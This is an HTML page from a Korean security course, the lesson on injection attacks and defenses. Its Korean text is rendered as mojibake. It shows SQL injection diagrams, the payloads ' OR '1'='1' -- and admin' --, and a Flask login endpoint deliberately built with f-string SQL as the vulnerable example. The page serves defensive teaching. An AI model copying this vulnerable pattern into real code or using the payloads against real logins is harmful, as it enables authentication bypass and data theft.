{% raw %}
<!DOCTYPE html>
<html lang="ko" data-theme="light">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>08. ì¸ì ì…˜ ê³µê²©ê³¼ ë°©ì–´ - Study Materials</title>
    <link rel="stylesheet" href="/study/static/css/style.css">
    <link rel="stylesheet" href="/study/static/css/highlight.css">
    <!-- KaTeX for LaTeX math rendering -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css">
    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.js"></script>
    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/auto-render.min.js"
        onload="renderMathInElement(document.body, {
            delimiters: [
                {left: '$$', right: '$$', display: true},
                {left: '$', right: '$', display: false}
            ],
            throwOnError: false
        });"></script>
    
</head>
<body>
    <div class="app-container">
        <!-- Sidebar -->
        <aside class="sidebar" id="sidebar">
            <div class="sidebar-header">
                <a href="/study/ko/" class="logo">Study Materials</a>
                <button class="sidebar-toggle" id="sidebar-toggle" aria-label="Toggle sidebar">
                    <span></span>
                </button>
            </div>

            <nav class="sidebar-nav">
                <a href="/study/ko/" class="nav-item ">
                    <span class="nav-icon">ğŸ </span>
                    <span class="nav-text">Home</span>
                </a>
                <a href="/study/examples/" class="nav-item ">
                    <span class="nav-icon">ğŸ’»</span>
                    <span class="nav-text">Examples</span>
                </a>
            </nav>

            <div class="sidebar-search">
                <form action="/study/ko/search.html" method="get" id="search-form">
                    <input type="search" name="q" placeholder="Search..." id="search-sidebar-input">
                </form>
            </div>

            <!-- Language Selector -->
            <div class="sidebar-lang">
                <select id="lang-select" class="lang-selector" onchange="switchLanguage(this.value)">
                    
                    <option value="en" >
                        English
                    </option>
                    
                    <option value="ko" selected>
                        í•œêµ­ì–´
                    </option>
                    
                </select>
            </div>

            <div class="sidebar-footer">
                <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">
                    <span class="theme-icon light">â˜€ï¸</span>
                    <span class="theme-icon dark">ğŸŒ™</span>
                </button>
            </div>
        </aside>

        <!-- Main Content -->
        <main class="main-content">
            <header class="main-header">
                <button class="menu-toggle" id="menu-toggle" aria-label="Open menu">
                    <span></span>
                </button>
                
<nav class="breadcrumb">
    <a href="/study/ko/">Topics</a>
    <span class="separator">/</span>
    <a href="/study/ko/Security/">Security</a>
    <span class="separator">/</span>
    <span class="current">08. ì¸ì ì…˜ ê³µê²©ê³¼ ë°©ì–´</span>
</nav>

            </header>

            <div class="content">
                
<article class="lesson-article">
    <header class="lesson-header">
        <h1>08. ì¸ì ì…˜ ê³µê²©ê³¼ ë°©ì–´</h1>
    </header>

    
<div class="lesson-toolbar lesson-toolbar--top">
    <div class="toolbar-nav toolbar-nav--prev">
        
        <a href="/study/ko/Security/07_OWASP_Top10.html" class="nav-prev">
            <span class="nav-label">Previous</span>
            <span class="nav-title">07. OWASP Top 10 (2021)</span>
        </a>
        
    </div>
    <div class="toolbar-actions">
        <button class="btn btn-copy-link" data-action="copy-link" title="Copy link">
            <span class="icon">ğŸ”—</span>
            <span class="text">Copy link</span>
        </button>
        <a href="/study/ko/Security/" class="btn btn-topic-link" title="Back to topic list">
            <span class="icon">ğŸ“‹</span>
            <span class="text">Topic list</span>
        </a>
    </div>
    <div class="toolbar-nav toolbar-nav--next">
        
        <a href="/study/ko/Security/09_Web_Security_Headers.html" class="nav-next">
            <span class="nav-label">Next</span>
            <span class="nav-title">Web Security Headersì™€ CSP</span>
        </a>
        
    </div>
</div>


    
    <nav class="toc" id="toc">
        <h2>Table of Contents</h2>
        <div class="toc">
<ul>
<li><a href="#_1">í•™ìŠµ ëª©í‘œ</a></li>
<li><a href="#1">1. ì¸ì ì…˜ì˜ ê·¼ë³¸ ì›ì¸</a></li>
<li><a href="#2-sql-injection">2. SQL Injection</a><ul>
<li><a href="#21-classic-sql-injection">2.1 Classic SQL Injection</a></li>
<li><a href="#22-blind-sql-injection">2.2 Blind SQL Injection</a></li>
<li><a href="#23-second-order-sql-injection">2.3 Second-Order SQL Injection</a></li>
<li><a href="#24-sqlalchemy-orm">2.4 SQLAlchemy ORM (ê¶Œì¥ ë°©ë²•)</a></li>
</ul>
</li>
<li><a href="#3-cross-site-scripting-xss">3. Cross-Site Scripting (XSS)</a><ul>
<li><a href="#31-xss">3.1 XSS ê°œìš”</a></li>
<li><a href="#32-reflected-xss">3.2 Reflected XSS</a></li>
<li><a href="#33-stored-xss">3.3 Stored XSS</a></li>
<li><a href="#34-dom-based-xss">3.4 DOM-Based XSS</a></li>
<li><a href="#35-xss">3.5 XSS ì»¨í…ìŠ¤íŠ¸ë³„ ì¸ì½”ë”©</a></li>
</ul>
</li>
<li><a href="#4-cross-site-request-forgery-csrf">4. Cross-Site Request Forgery (CSRF)</a><ul>
<li><a href="#41-csrf">4.1 CSRF ì‘ë™ ë°©ì‹</a></li>
<li><a href="#42-csrf">4.2 CSRF ë°©ì§€</a></li>
<li><a href="#43-csrf">4.3 CSRF ë°©ì§€ ìš”ì•½</a></li>
</ul>
</li>
<li><a href="#5-command-injection">5. Command Injection</a><ul>
<li><a href="#51-command-injection">5.1 Command Injection ì‘ë™ ë°©ì‹</a></li>
<li><a href="#52">5.2 ì·¨ì•½ ì½”ë“œì™€ ìˆ˜ì • ì½”ë“œ</a></li>
<li><a href="#53-command-injection">5.3 Command Injection ë°©ì§€ ê·œì¹™</a></li>
</ul>
</li>
<li><a href="#6-ldap-injection">6. LDAP Injection</a><ul>
<li><a href="#61-ldap-injection">6.1 LDAP Injection ì‘ë™ ë°©ì‹</a></li>
<li><a href="#62">6.2 ì·¨ì•½ ì½”ë“œì™€ ìˆ˜ì • ì½”ë“œ</a></li>
</ul>
</li>
<li><a href="#7-server-side-template-injection-ssti">7. Server-Side Template Injection (SSTI)</a><ul>
<li><a href="#71-ssti">7.1 SSTI ì‘ë™ ë°©ì‹</a></li>
<li><a href="#72">7.2 ì·¨ì•½ ì½”ë“œì™€ ìˆ˜ì • ì½”ë“œ</a></li>
<li><a href="#73-ssti">7.3 SSTI íƒì§€ ì¹˜íŠ¸ ì‹œíŠ¸</a></li>
</ul>
</li>
<li><a href="#8-content-security-policy-csp">8. Content Security Policy (CSP)</a><ul>
<li><a href="#81-csp">8.1 ë°©ì–´ ê³„ì¸µìœ¼ë¡œì„œì˜ CSP</a></li>
<li><a href="#82-csp">8.2 CSP êµ¬í˜„</a></li>
<li><a href="#83-csp">8.3 CSP ë°°í¬ ì „ëµ</a></li>
</ul>
</li>
<li><a href="#9">9. ì‹¬ì¸µ ë°©ì–´ ìš”ì•½</a></li>
<li><a href="#10">10. ì—°ìŠµ ë¬¸ì œ</a><ul>
<li><a href="#1-sql-injection">ì—°ìŠµ ë¬¸ì œ 1: SQL Injection ë©</a></li>
<li><a href="#2-xss">ì—°ìŠµ ë¬¸ì œ 2: XSS ì±Œë¦°ì§€</a></li>
<li><a href="#3-csrf">ì—°ìŠµ ë¬¸ì œ 3: CSRF ë°©ì–´</a></li>
<li><a href="#4-command-injection">ì—°ìŠµ ë¬¸ì œ 4: Command Injection ë°©ì§€</a></li>
<li><a href="#5">ì—°ìŠµ ë¬¸ì œ 5: ì „ì²´ ì• í”Œë¦¬ì¼€ì´ì…˜ ë³´ì•ˆ ê²€í† </a></li>
</ul>
</li>
<li><a href="#11">11. ìš”ì•½</a></li>
</ul>
</div>

    </nav>
    

    <div class="lesson-content markdown-body">
        <h1 id="08">08. ì¸ì ì…˜ ê³µê²©ê³¼ ë°©ì–´<a class="header-link" href="#08" title="Permanent link">&para;</a></h1>
<p><strong>ì´ì „</strong>: <a href="07_OWASP_Top10.md">07. OWASP Top 10 (2021)</a> | <strong>ë‹¤ìŒ</strong>: <a href="./09_Web_Security_Headers.md">09. ì›¹ ë³´ì•ˆ í—¤ë”ì™€ CSP</a></p>
<hr />
<p>ì¸ì ì…˜ ê³µê²©ì€ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ê°€ì¥ ì¹˜ëª…ì ì¸ ì·¨ì•½ì  ì¤‘ í•˜ë‚˜ë¡œ ë‚¨ì•„ ìˆìŠµë‹ˆë‹¤. ì¸ì ì…˜ì€ ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ë°ì´í„°ê°€ ëª…ë ¹ì–´ë‚˜ ì¿¼ë¦¬ì˜ ì¼ë¶€ë¡œ ì¸í„°í”„ë¦¬í„°ì— ì „ì†¡ë˜ì–´ ì˜ë„í•˜ì§€ ì•Šì€ ì‹¤í–‰ì„ ì´ˆë˜í•  ë•Œ ë°œìƒí•©ë‹ˆë‹¤. ì¸ì ì…˜ì´ OWASP Top 10ì—ì„œ 1ìœ„ì—ì„œ 3ìœ„ë¡œ ë‚´ë ¤ê°”ì§€ë§Œ, ë‹¨ì¼ ì¸ì ì…˜ ì·¨ì•½ì ì´ ì™„ì „í•œ ë°ì´í„° ìœ ì¶œì´ë‚˜ ì‹œìŠ¤í…œ ì¹¨í•´ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ì—¬ì „íˆ ë§¤ìš° ìœ„í—˜í•©ë‹ˆë‹¤. ì´ ë ˆìŠ¨ì—ì„œëŠ” SQL injection, Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), command injection, LDAP injection, Server-Side Template Injection (SSTI)ì— ëŒ€í•œ ì‹¬ì¸µ ë¶„ì„ê³¼ ê°ê°ì— ëŒ€í•œ ì·¨ì•½í•œ ì½”ë“œì™€ ì•ˆì „í•œ ì½”ë“œ ì˜ˆì œë¥¼ ì œê³µí•©ë‹ˆë‹¤.</p>
<h2 id="_1">í•™ìŠµ ëª©í‘œ<a class="header-link" href="#_1" title="Permanent link">&para;</a></h2>
<ul>
<li>ì¸ì ì…˜ ì·¨ì•½ì ì˜ ê·¼ë³¸ ì›ì¸ ì´í•´ (ì½”ë“œì™€ ë°ì´í„°ì˜ í˜¼í•©)</li>
<li>SQL injection ë³€í˜• ì‹ë³„ ë° ì•…ìš© (classic, blind, second-order)</li>
<li>ì„¸ ê°€ì§€ XSS ìœ í˜• ì¸ì‹ ë° ë°©ì§€ (reflected, stored, DOM-based)</li>
<li>CSRF í† í°ê³¼ SameSite ì¿ í‚¤ë¡œ CSRF ë°©ì–´ êµ¬í˜„</li>
<li>command injection, LDAP injection, template injection ë°©ì§€</li>
<li>ë§¤ê°œë³€ìˆ˜í™”ëœ ì¿¼ë¦¬, ì¶œë ¥ ì¸ì½”ë”©, Content Security Policyë¡œ ì‹¬ì¸µ ë°©ì–´ ì ìš©</li>
<li>ê° ì¸ì ì…˜ ìœ í˜•ì— ëŒ€í•œ Python/Flask ì•ˆì „ ì½”ë“œ íŒ¨í„´ ì‘ì„±</li>
</ul>
<hr />
<h2 id="1">1. ì¸ì ì…˜ì˜ ê·¼ë³¸ ì›ì¸<a class="header-link" href="#1" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="n">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="n">â”‚</span><span class="w">              </span><span class="n">ì¸ì ì…˜ì´</span><span class="w"> </span><span class="n">ë°œìƒí•˜ëŠ”</span><span class="w"> </span><span class="n">ì´ìœ </span><span class="w">                                </span><span class="n">â”‚</span>
<span class="n">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="n">â”‚</span><span class="w">                                                                  </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">ê·¼ë³¸ì ì¸</span><span class="w"> </span><span class="n">ë¬¸ì œ</span><span class="err">:</span><span class="w">                                                   </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">ì½”ë“œ</span><span class="p">(</span><span class="n">CODE</span><span class="p">)</span><span class="n">ì™€</span><span class="w"> </span><span class="n">ë°ì´í„°</span><span class="p">(</span><span class="k">DATA</span><span class="p">)</span><span class="n">ê°€</span><span class="w"> </span><span class="n">ë™ì¼í•œ</span><span class="w"> </span><span class="n">ì±„ë„ì—ì„œ</span><span class="w"> </span><span class="n">í˜¼í•©ë¨</span><span class="w">                </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">                                                                  </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">ì •ìƒ</span><span class="w"> </span><span class="n">ì‘ë™</span><span class="err">:</span><span class="w">                                                       </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><span class="w">               </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">â”‚</span><span class="w">  </span><span class="k">SELECT</span><span class="w"> </span><span class="err">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">name</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="s1">&#39;Alice&#39;</span><span class="w">    </span><span class="n">â”‚</span><span class="w">               </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">â”‚</span><span class="w">  </span><span class="n">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><span class="w"> </span><span class="n">CODE</span><span class="w"> </span><span class="n">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><span class="w">  </span><span class="n">â”€â”€</span><span class="w"> </span><span class="k">DATA</span><span class="w"> </span><span class="n">â”€â”€</span><span class="w">   </span><span class="n">â”‚</span><span class="w">               </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><span class="w">               </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">                                                                  </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">ì¸ì ì…˜</span><span class="err">:</span><span class="w">                                                         </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><span class="w">   </span><span class="n">â”‚</span>
<span class="n">â”‚</span><span class="w">  </span><span class="n">â”‚</span><span class="w">  </span><span class="k">SELECT</span><span class="w"> </span><span class="err">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">name</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="err">=</span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="err">--</span><span class="s1">&#39;      â”‚   â”‚</span>
<span class="s1">â”‚  â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ CODE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€   â”€â”€INJECTED CODEâ”€â”€       â”‚   â”‚</span>
<span class="s1">â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚</span>
<span class="s1">â”‚                                                                  â”‚</span>
<span class="s1">â”‚  ì¸í„°í”„ë¦¬í„°ëŠ” ë‹¤ìŒì„ êµ¬ë³„í•  ìˆ˜ ì—†ìŒ:                               â”‚</span>
<span class="s1">â”‚  - ê°œë°œìê°€ ì˜ë„í•œ ì½”ë“œ                                           â”‚</span>
<span class="s1">â”‚  - ê³µê²©ìê°€ ì£¼ì…í•œ ì½”ë“œ                                           â”‚</span>
<span class="s1">â”‚                                                                  â”‚</span>
<span class="s1">â”‚  í•´ê²°ì±…: ì½”ë“œì™€ ë°ì´í„°ë¥¼ ì ˆëŒ€ í˜¼í•©í•˜ì§€ ì•ŠìŒ                        â”‚</span>
<span class="s1">â”‚  ë¶„ë¦¬ëœ ìƒíƒœë¡œ ìœ ì§€í•˜ëŠ” ë§¤ê°œë³€ìˆ˜í™”ëœ ì¸í„°í˜ì´ìŠ¤ ì‚¬ìš©                â”‚</span>
<span class="s1">â”‚                                                                  â”‚</span>
<span class="s1">â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”               â”‚</span>
<span class="s1">â”‚  â”‚  Prepared Statement:                          â”‚               â”‚</span>
<span class="s1">â”‚  â”‚  Code:  SELECT * FROM users WHERE name = ?    â”‚               â”‚</span>
<span class="s1">â”‚  â”‚  Data:  [&quot;&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="err">=</span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="err">--</span><span class="s2">&quot;]                   â”‚               â”‚</span>
<span class="s2">â”‚  â”‚  Result: ì „ì²´ ì…ë ¥ì„ ë¬¸ìì—´ë¡œ ì²˜ë¦¬             â”‚               â”‚</span>
<span class="s2">â”‚  â”‚  ì¸ì ì…˜ ë¶ˆê°€ëŠ¥!                                â”‚               â”‚</span>
<span class="s2">â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜               â”‚</span>
<span class="s2">â”‚                                                                  â”‚</span>
<span class="s2">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre></div>

<hr />
<h2 id="2-sql-injection">2. SQL Injection<a class="header-link" href="#2-sql-injection" title="Permanent link">&para;</a></h2>
<h3 id="21-classic-sql-injection">2.1 Classic SQL Injection<a class="header-link" href="#21-classic-sql-injection" title="Permanent link">&para;</a></h3>
<p>Classic (ë˜ëŠ” in-band) SQL injectionì€ ê°€ì¥ ì§ì ‘ì ì¸ ìœ í˜•ìœ¼ë¡œ, ê³µê²©ìê°€ ì£¼ì…ëœ ì¿¼ë¦¬ì˜ ê²°ê³¼ë¥¼ ì• í”Œë¦¬ì¼€ì´ì…˜ ì‘ë‹µì—ì„œ ì§ì ‘ ë°›ìŠµë‹ˆë‹¤.</p>
<div class="highlight"><pre><span></span><code><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="err">â”‚</span><span class="w">              </span><span class="n">Classic</span><span class="w"> </span><span class="k">SQL</span><span class="w"> </span><span class="n">Injection</span><span class="w">                                </span><span class="err">â”‚</span>
<span class="err">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">ë¡œê·¸ì¸</span><span class="w"> </span><span class="nl">í¼</span><span class="p">:</span><span class="w">                                                       </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><span class="w">                                </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”‚</span><span class="w"> </span><span class="nl">Username</span><span class="p">:</span><span class="w"> </span><span class="k">admin</span><span class="s1">&#39; --         â”‚                                â”‚</span>
<span class="s1">â”‚  â”‚ Password: anything          â”‚                                â”‚</span>
<span class="s1">â”‚  â”‚ [Login]                     â”‚                                â”‚</span>
<span class="s1">â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                â”‚</span>
<span class="s1">â”‚                                                                  â”‚</span>
<span class="s1">â”‚  ì˜ë„ëœ ì¿¼ë¦¬:                                                     â”‚</span>
<span class="s1">â”‚  SELECT * FROM users                                             â”‚</span>
<span class="s1">â”‚  WHERE username = &#39;</span><span class="k">admin</span><span class="s1">&#39; AND password = &#39;</span><span class="n">hashed_pwd</span><span class="s1">&#39;           â”‚</span>
<span class="s1">â”‚                                                                  â”‚</span>
<span class="s1">â”‚  ì£¼ì…ëœ ì¿¼ë¦¬:                                                     â”‚</span>
<span class="s1">â”‚  SELECT * FROM users                                             â”‚</span>
<span class="s1">â”‚  WHERE username = &#39;</span><span class="k">admin</span><span class="s1">&#39; --&#39;</span><span class="w"> </span><span class="ow">AND</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;anything&#39;</span><span class="w">         </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                      </span><span class="err">â”‚</span><span class="w">        </span><span class="err">â”‚</span><span class="w">                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                      </span><span class="err">â”‚</span><span class="w">        </span><span class="err">â””â”€â”€</span><span class="w"> </span><span class="n">ì£¼ì„</span><span class="p">,</span><span class="w"> </span><span class="n">ë‚˜ë¨¸ì§€</span><span class="w"> </span><span class="n">ë¬´ì‹œ</span><span class="w">               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                      </span><span class="err">â””â”€â”€</span><span class="w"> </span><span class="n">í•­ìƒ</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="n">ì‚¬ìš©ìì™€</span><span class="w"> </span><span class="n">ì¼ì¹˜</span><span class="w">                </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nl">ê²°ê³¼</span><span class="p">:</span><span class="w"> </span><span class="n">ë¹„ë°€ë²ˆí˜¸</span><span class="w"> </span><span class="n">ì—†ì´</span><span class="w"> </span><span class="n">adminìœ¼ë¡œ</span><span class="w"> </span><span class="n">ë¡œê·¸ì¸</span><span class="w"> </span><span class="n">ì„±ê³µ</span><span class="err">!</span><span class="w">                        </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">sql_injection_examples.py - SQL injection ì·¨ì•½ ì½”ë“œì™€ ìˆ˜ì • ì½”ë“œ</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sqlite3</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">g</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="n">DATABASE</span> <span class="o">=</span> <span class="s1">&#39;app.db&#39;</span>


<span class="k">def</span><span class="w"> </span><span class="nf">get_db</span><span class="p">():</span>
    <span class="k">if</span> <span class="s1">&#39;db&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">g</span><span class="p">:</span>
        <span class="n">g</span><span class="o">.</span><span class="n">db</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">DATABASE</span><span class="p">)</span>
        <span class="n">g</span><span class="o">.</span><span class="n">db</span><span class="o">.</span><span class="n">row_factory</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">Row</span>
    <span class="k">return</span> <span class="n">g</span><span class="o">.</span><span class="n">db</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># ì·¨ì•½: ë¬¸ìì—´ ì—°ê²° (Classic SQLi)</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/v1/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">login_vulnerable</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ì·¨ì•½: ë¡œê·¸ì¸ì—ì„œ SQL Injection.&quot;&quot;&quot;</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">)</span>

    <span class="n">db</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
    <span class="c1"># ì ˆëŒ€ í•˜ì§€ ë§ ê²ƒ: ì‚¬ìš©ì ì…ë ¥ê³¼ ë¬¸ìì—´ í¬ë§¤íŒ…</span>
    <span class="n">query</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;SELECT * FROM users WHERE username = &#39;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#39; AND password = &#39;</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&#39;&quot;</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>

    <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;logged in&quot;</span><span class="p">,</span> <span class="s2">&quot;user&quot;</span><span class="p">:</span> <span class="n">user</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]})</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid credentials&quot;</span><span class="p">}),</span> <span class="mi">401</span>

<span class="c1"># ê³µê²© í˜ì´ë¡œë“œ:</span>
<span class="c1"># username: admin&#39; --           â†’ ë¹„ë°€ë²ˆí˜¸ ê²€ì‚¬ ìš°íšŒ</span>
